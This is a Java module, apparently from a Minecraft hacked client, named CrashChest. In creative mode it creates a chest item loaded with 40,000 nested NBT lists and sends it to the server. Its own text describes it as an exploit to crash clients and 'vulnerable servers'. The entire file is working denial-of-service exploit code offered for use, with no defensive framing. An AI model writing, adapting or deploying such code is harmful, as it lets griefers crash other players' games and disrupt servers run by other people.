package client.module.impl.items;

import client.module.Category;
import client.module.Module;
import client.utils.misc.ChatUtils;
import net.minecraft.client.Minecraft;
import net.minecraft.init.Blocks;
import net.minecraft.inventory.EntityEquipmentSlot;
import net.minecraft.item.Item;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;

public class CrashChest extends Module {

    private final Minecraft mc = Minecraft.getMinecraft();

    public CrashChest() {
        super("CrashChest", Category.ITEMS);
        setDescription("Creates an exploit chest with nested nbt data to crash clients");
    }

    @Override
    public void onEnable() {
        super.onEnable();
        if (!nullCheck()) {
            toggle();
            return;
        }
        if (!mc.player.capabilities.isCreativeMode) {
            ChatUtils.error("CrashChest requires Creative mode!");
            toggle();
            return;
        }
        ItemStack feet = mc.player.getItemStackFromSlot(EntityEquipmentSlot.FEET);
        if (feet != null && !feet.func_190926_b()) {
            ChatUtils.error("Take off your boots first!");
            toggle();
            return;
        }
        ItemStack chest = new ItemStack(Item.getItemFromBlock(Blocks.CHEST), 1);
        NBTTagCompound nbt = new NBTTagCompound();
        chest.writeToNBT(nbt);
        NBTTagList outerList = new NBTTagList();
        for (int i = 0; i < 40000; i++) {
            outerList.appendTag(new NBTTagList());
        }
        nbt.setTag("www.wurstclient.net", outerList);
        chest.setTagCompound(nbt);
        mc.player.setItemStackToSlot(EntityEquipmentSlot.FEET, chest);
        mc.player.inventoryContainer.detectAndSendChanges();
        ChatUtils.success("Crash Chest created in your boots slot! Place it to crash vulnerable servers.");
        toggle();
    }
}
